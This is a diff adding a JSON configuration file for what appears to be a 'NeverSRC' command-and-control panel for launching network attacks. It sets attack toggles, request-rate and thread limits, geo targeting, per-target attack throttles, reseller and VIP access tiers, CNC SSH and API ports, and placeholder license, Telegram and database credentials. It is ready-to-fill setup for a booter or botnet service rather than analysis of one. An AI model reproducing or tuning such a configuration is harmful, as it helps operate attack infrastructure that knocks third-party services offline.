@@ -1,0 +1,178 @@
+{
+  "Attack_Settings": {
+    "Attack_Status": {
+      "admins_bypass_disabled_attacks": false,
+      "attacks_enabled": true
+    }
+  },
+  "Chat_Settings": {
+    "Enabled": true,
+    "Max_Messages": 10000,
+    "Max_Messages_Per_User_Per_Minute": 10,
+    "Max_Users": 100,
+    "Restrictions": {
+      "Only_Admins_Can_Access_Chat": false,
+      "Only_Holders_Can_Access_Chat": false,
+      "Only_Resellers_Can_Access_Chat": false,
+      "Only_Users_Can_Access_Chat": false,
+      "Only_VIPs_Can_Access_Chat": false
+    },
+    "Title": "=== Never SRC GLOBAL CHAT ==="
+  },
+  "Security_Settings": {
+    "Blacklist_IP_CNC_API": {
+      "IPs": [
+        "1.1.1.1"
+      ],
+      "enabled": false
+    },
+    "Blocked_SSH_Clients": [
+      "ssh2js",
+      "ubuntu",
+      "SSH-2.0-libssh2_1.11.0",
+      "SSH-2.0-paramiko",
+      "SSH-2.0-JSCH",
+      "SSH-2.0-Go"
+    ],
+    "Max_Connections_Per_IP": {
+      "cooldown_minutes": 1,
+      "enabled": true,
+      "max_connections": 3,
+      "time_window_minutes": 1
+    },
+    "Whitelist_CNC_IP": {
+      "IPs": [
+        "8.8.8.8",
+        "1.1.1.1"
+      ],
+      "enabled": false
+    },
+    "Whitelist_IP_FOR_API": {
+      "IPs": [
+        "8.8.8.8",
+        "1.1.1.1"
+      ],
+      "enabled": false
+    },
+    "Whitelisted_SSH_Clients": {
+      "enabled": false,
+      "list": [
+        "SSH-2.0-PuTTY_Release_0.82",
+        "SSH-2.0-OpenSSH",
+        "SSH-2.0-PuTTY"
+      ]
+    },
+    "note_Blacklist_IPs": "IPs blocked from accessing the CNC and API (global blacklist).",
+    "note_Blocked_SSH_Clients": "List of SSH clients blocked for accessing NeverSRC.",
+    "note_Max_Connections_Per_IP": "Limits connection attempts per IP address to prevent brute force attacks.",
+    "note_Whitelist_API": "IPs allowed for accessing API endpoints.",
+    "note_Whitelist_CNC_IP": "IPs allowed to Connect to CNC (SSH). If enabled, only these IPs can connect.",
+    "note_Whitelisted_SSH_Clients": "If enabled, only these SSH clients can connect."
+  },
+  "Spam_Protection_Settings": {
+    "user_spam_protection": {
+      "in_general": {
+        "Actions": {
+          "close_user_session": false,
+          "give_captcha": false,
+          "lock_account": {
+            "duration_in_days": 1,
+            "enabled": false,
+            "message": "Your account has been temporarily locked due to spam behavior. Please contact an administrator."
+          },
+          "warn_and_block_attack": true
+        },
+        "settings": {
+          "amount": 5,
+          "enabled": true,
+          "per_seconds": 60
+        }
+      },
+      "per_target": {
+        "actions": {
+          "close_user_session": false,
+          "give_captcha": false,
+          "lock_account": {
+            "duration_in_days": 2,
+            "enabled": false,
+            "message": "Your account has been locked for repeatedly attacking the same target."
+          },
+          "warn_and_block_attack": true
+        },
+        "settings": {
+          "amount": 3,
+          "enabled": true,
+          "per_seconds": 30
+        }
+      }
+    }
+  },
+  "api_options": {
+    "api_global_cooldown": {
+      "enabled": true,
+      "per_attack_delay_ms": 100
+    },
+    "api_loading_delay": {
+      "delay_seconds": 3,
+      "enabled": true,
+      "show_countdown": true
+    },
+    "geo": {
+      "default": "ALL",
+      "list": [
+        "CN",
+        "JP",
+        "US"
+      ]
+    },
+    "len": {
+      "default": 1,
+      "max": 1024,
+      "min": 1
+    },
+    "rps": {
+      "default": 64,
+      "max": 300,
+      "min": 1
+    },
+    "show_host_information_in_api_response": true,
+    "threads": {
+      "default": 5,
+      "max": 100,
+      "min": 1
+    }
+  },
+  "cnc": {
+    "api_port": "1234",
+    "connection_ip": "0.0.0.0",
+    "current_theme": "neverc2",
+    "global_cooldown": 0,
+    "global_slots": 1,
+    "license": "your-license-here",
+    "port": "1337"
+  },
+  "misc": {
+    "spinner": {
+      "frames": [
+        "[|]",
+        "[/]",
+        "[-]",
+        "[\\]",
+        "[|]"
+      ],
+      "note_speed_ms": "Values below 500ms may cause visual bugs in the spinner",
+      "speed_ms": 500
+    }
+  },
+  "telegram": {
+    "enabled": false,
+    "bot_token": "token-here",
+    "note": "Get your bot token from @BotFather on Telegram"
+  },
+  "mysql": {
+    "db_host": "localhost",
+    "db_name": "your-db-name-here",
+    "db_pass": "your-db-pass-here",
+    "db_user": "your-db-user-here"
+  }
+}
